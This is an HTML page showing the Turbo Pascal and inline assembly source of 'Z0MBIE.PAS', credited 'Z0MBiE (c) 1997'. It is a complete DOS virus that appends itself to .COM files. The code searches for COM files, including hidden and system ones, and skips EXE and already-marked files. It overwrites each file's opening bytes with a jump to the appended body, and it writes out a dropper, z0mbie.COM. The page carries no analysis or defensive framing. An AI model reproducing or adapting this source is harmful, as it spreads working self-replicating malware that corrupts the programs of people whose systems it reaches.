<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Z0MBIE.PAS</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
	color: #808080;
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc14 {
	font-weight: bold;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">{$M 1024,0,0}</span><span class="sc0">           </span><span class="sc1">{ memory }</span><span class="sc0">

</span><span class="sc9">{$R-,S-,I-,Q-}</span><span class="sc0">          </span><span class="sc1">{ all checking OFF }</span><span class="sc0">
</span><span class="sc9">{$G+,N-,E-}</span><span class="sc0">             </span><span class="sc1">{ code generation: CPU on, NPU,emulation off }</span><span class="sc0">
</span><span class="sc9">{$A-,B-,X+,V-,T-,P-,O-}</span><span class="sc0"> </span><span class="sc1">{ options }</span><span class="sc0">
</span><span class="sc9">{$F-}</span><span class="sc0">                   </span><span class="sc1">{ FAR calls }</span><span class="sc0">
</span><span class="sc9">{$D+,L+}</span><span class="sc0">                </span><span class="sc1">{ DEBUG info }</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">Main</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">Near</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">forward</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">CodeEnd</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">forward</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">getSI</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">forward</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">saveHeader</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">forward</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">EntryPoint</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">Near</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    mov al, 55h
    out 80h, al
    xor al, al
    in al, 80h
    cmp al, 55h
    jne @@3

    CALL getSI
    mov bx, si

@@0:jmp @@1

    LEA SI, saveHeader[BX]
    MOV DI, 100h
    MOV CX, 32
    CLD
    REP MOVSB

    jmp @@2

@@1:mov byte ptr cs:[bx + offset @@0 + 1], 0

@@2:CALL Main

@@3:MOV SI, 100H
    JMP SI
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">ComFiles</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">asm</span><span class="sc14"> DB </span><span class="sc7">'*.COM'</span><span class="sc14">,0 </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">GetSI</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    CALL @@1
@@1:POP SI
    SUB SI, OFFSET @@1
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">const</span><span class="sc0">
  </span><span class="sc11">faReadOnly</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">$01</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">faHidden</span><span class="sc0">    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">$02</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">faSystem</span><span class="sc0">    </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">$04</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">faVolumeID</span><span class="sc0">  </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">$08</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">faDirectory</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">$10</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">faArchive</span><span class="sc0">   </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">$20</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">faAnyFile</span><span class="sc0">   </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">$3F</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">type</span><span class="sc0">
  </span><span class="sc11">PSearchRec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">^</span><span class="sc11">TSearchRec</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">TSearchRec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">record</span><span class="sc0">
    </span><span class="sc11">Drive</span><span class="sc0">      </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Char</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Name8</span><span class="sc0">      </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">8</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">Char</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Ext3</span><span class="sc0">       </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">Char</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SearchAttr</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Num</span><span class="sc0">        </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Cluster</span><span class="sc0">    </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Unused</span><span class="sc0">     </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Attr</span><span class="sc0">       </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Time</span><span class="sc0">       </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Date</span><span class="sc0">       </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Size</span><span class="sc0">       </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Longint</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Name</span><span class="sc0">       </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">12</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">Char</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">



</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">FindFirst</span><span class="sc10">(</span><span class="sc11">Dta</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">PSearchRec</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Attr</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Byte</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Files</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">PChar</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    PUSH DS

    MOV AH, 2FH
    INT 21H
    PUSH ES
    PUSH BX

    MOV AH, 1AH
    LDS DX, Dta
    INT 21H

    MOV AH, 4EH
    LDS DX, Files
    XOR CH, CH
    MOV CL, Attr
    INT 21H

    MOV AH, 1AH
    POP DX
    POP DS
    INT 21H

    POP DS
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc5">message</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    DB </span><span class="sc7">'Z0MBiE (c) 1997'</span><span class="sc14">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">FindNext</span><span class="sc10">(</span><span class="sc11">Dta</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">PSearchRec</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    PUSH DS

    MOV AH, 2FH
    INT 21H
    PUSH ES
    PUSH BX

    MOV AH, 1AH
    LDS DX, Dta
    INT 21H

    MOV AH, 4FH
    INT 21H

    MOV AH, 1AH
    POP DX
    POP DS
    INT 21H

    POP DS
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">CF</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Boolean</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc1">{ or SETALC for Pentium (DB 0D6H) }</span><span class="sc0">
  </span><span class="sc5">inline</span><span class="sc10">(</span><span class="sc4">$B0</span><span class="sc10">/</span><span class="sc4">$01</span><span class="sc10">/</span><span class="sc0">    </span><span class="sc1">{ MOV AL, 1 }</span><span class="sc0">
         </span><span class="sc4">$72</span><span class="sc10">/</span><span class="sc4">$02</span><span class="sc10">/</span><span class="sc0">    </span><span class="sc1">{ JC $+4    }</span><span class="sc0">
         </span><span class="sc4">$B0</span><span class="sc10">/</span><span class="sc4">$00</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc1">{ MOV AL, 0 }</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc5">Write</span><span class="sc10">(</span><span class="sc11">X</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">PChar</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">var</span><span class="sc0">
    </span><span class="sc11">C</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Char</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">begin</span><span class="sc0">
    </span><span class="sc5">repeat</span><span class="sc0">
      </span><span class="sc11">C</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">X</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">C</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">#0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc11">Break</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc5">asm</span><span class="sc14">
        MOV AL, C
        INT 29H
      </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">Inc</span><span class="sc10">(</span><span class="sc11">X</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">until</span><span class="sc0"> </span><span class="sc11">false</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">function</span><span class="sc0"> </span><span class="sc11">openFile</span><span class="sc10">(</span><span class="sc11">FileName</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Pointer</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    PUSH DS
    MOV AX, 3D02H
    LDS DX, FileName
    INT 21H
    POP DS
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">closeFile</span><span class="sc10">(</span><span class="sc11">Handle</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    MOV AH, 3EH
    MOV BX, Handle
    INT 21H
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">readFile</span><span class="sc10">(</span><span class="sc11">Handle</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">DataPtr</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Pointer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Count</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    PUSH DS
    MOV AH, 3FH
    MOV BX, Handle
    LDS DX, DataPtr
    MOV CX, Count
    INT 21H
    POP DS
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">writeFile</span><span class="sc10">(</span><span class="sc11">Handle</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">DataPtr</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Pointer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Count</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    PUSH DS
    MOV AH, 40H
    MOV BX, Handle
    LDS DX, DataPtr
    MOV CX, Count
    INT 21H
    POP DS
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">Seek</span><span class="sc10">(</span><span class="sc11">Handle</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Pos</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Longint</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    MOV AX, 4200H
    MOV BX, Handle
    MOV CX, Pos.Word[2]
    MOV DX, Pos.Word[0]
    INT 21H
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">SaveHeader</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    DB </span><span class="sc7">'0123456789abcdef'</span><span class="sc14">
    DB </span><span class="sc7">'0123456789abcdef'</span><span class="sc14">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">Copy</span><span class="sc10">(</span><span class="sc11">Source</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Dest</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Pointer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Count</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">assembler</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    PUSH DS
    LDS SI, Source
    LES DI, Dest
    MOV CX, Count
    CLD
    REP MOVSB
    POP DS
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">Main</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">var</span><span class="sc0">
    </span><span class="sc11">Shift</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">Dta</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TSearchRec</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">InfectFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">var</span><span class="sc0">
      </span><span class="sc11">Handle</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">header</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">array</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc0">.</span><span class="sc10">.</span><span class="sc4">32</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc5">of</span><span class="sc0"> </span><span class="sc11">byte</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">begin</span><span class="sc0">

      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Dta.Size</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc4">2000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Dta.Size</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc4">64000</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc10">;</span><span class="sc0">

      </span><span class="sc11">handle</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">openFile</span><span class="sc10">(</span><span class="sc0">@</span><span class="sc11">Dta.Name</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">CF</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc10">;</span><span class="sc0">

      </span><span class="sc11">readFile</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> @</span><span class="sc11">header</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">header</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">$E8</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">or</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">header</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc11">header</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">header</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc11">ord</span><span class="sc10">(</span><span class="sc7">'M'</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">and</span><span class="sc0">
         </span><span class="sc10">(</span><span class="sc11">header</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc11">ord</span><span class="sc10">(</span><span class="sc7">'Z'</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc1">{ 1 - не ошибка! }</span><span class="sc0">

      </span><span class="sc5">begin</span><span class="sc0">

        </span><span class="sc11">copy</span><span class="sc10">(</span><span class="sc0">@</span><span class="sc11">header</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Ptr</span><span class="sc10">(</span><span class="sc11">CSeg</span><span class="sc10">,</span><span class="sc11">ofs</span><span class="sc10">(</span><span class="sc11">SaveHeader</span><span class="sc10">)+</span><span class="sc11">shift</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">header</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">$E8</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">header</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">lo</span><span class="sc10">(</span><span class="sc11">dta.size</span><span class="sc10">-</span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">header</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">hi</span><span class="sc10">(</span><span class="sc11">dta.size</span><span class="sc10">-</span><span class="sc4">3</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">header</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">header</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">];</span><span class="sc0">

        </span><span class="sc11">seek</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">writeFile</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> @</span><span class="sc11">header</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">32</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">seek</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dta.size</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">writefile</span><span class="sc10">(</span><span class="sc11">handle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Ptr</span><span class="sc10">(</span><span class="sc11">CSeg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">shift</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ofs</span><span class="sc10">(</span><span class="sc11">CodeEnd</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

      </span><span class="sc11">closeFile</span><span class="sc10">(</span><span class="sc11">Handle</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">begin</span><span class="sc0">

    </span><span class="sc11">GetSI</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">asm</span><span class="sc14"> MOV Shift, SI </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">FindFirst</span><span class="sc10">(</span><span class="sc0">@</span><span class="sc11">Dta</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">faArchive</span><span class="sc10">+</span><span class="sc11">faReadOnly</span><span class="sc10">+</span><span class="sc11">faHidden</span><span class="sc10">+</span><span class="sc11">faSystem</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Ptr</span><span class="sc10">(</span><span class="sc11">CSeg</span><span class="sc10">,</span><span class="sc11">Ofs</span><span class="sc10">(</span><span class="sc11">ComFiles</span><span class="sc10">)+</span><span class="sc11">Shift</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc5">not</span><span class="sc0"> </span><span class="sc11">CF</span><span class="sc0"> </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc5">begin</span><span class="sc0">

      </span><span class="sc11">InfectFile</span><span class="sc10">;</span><span class="sc0">

      </span><span class="sc11">FindNext</span><span class="sc10">(</span><span class="sc0">@</span><span class="sc11">Dta</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">CodeEnd</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc5">begin</span><span class="sc0"> </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">const</span><span class="sc0">
  </span><span class="sc11">FileName</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">String</span><span class="sc10">[</span><span class="sc4">10</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'z0mbie.COM'#0</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">begin</span><span class="sc0">
  </span><span class="sc5">asm</span><span class="sc14">
    MOV AH, 3CH
    MOV DX, OFFSET FileName[1]
    XOR CX, CX
    INT 21H

    XCHG BX, AX

    MOV AH, 40H
    PUSH CS
    POP DS
    MOV DX, OFFSET EntryPoint
    MOV CX, OFFSET CodeEnd
    INT 21H

    MOV AH, 3EH
    INT 21H
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">end.</span><span class="sc0">
</span></div></body>
</html>
